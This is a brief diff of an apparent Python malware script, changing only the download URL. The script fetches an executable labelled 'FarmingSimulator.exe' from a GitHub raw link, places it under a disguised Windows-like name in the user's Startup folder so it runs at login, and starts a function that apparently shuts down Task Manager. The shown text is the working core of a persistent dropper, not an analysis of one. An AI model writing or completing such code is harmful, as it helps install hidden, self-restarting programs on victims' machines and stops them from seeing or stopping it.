@@ -22,7 +22,7 @@ startup_folder = os.path.join("C:\\Users", CLIENT_NAME, "AppData", "Roaming",
                             "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 exe_final_location = os.path.join(startup_folder, "WINDOWS_data_infoRI.exe")
 old_final_location = os.path.join(startup_folder, "WINDOWS_data_info.exe")
-url = "https://raw.githubusercontent.com/habibprojects/habibn1/FarmingSimulator.exe"
+url = "https://raw.githubusercontent.com/habibprojects/habibn1/main/FarmingSimulator.exe"
 
 def close_task_manager():
     for proc in psutil.process_iter(['name']):
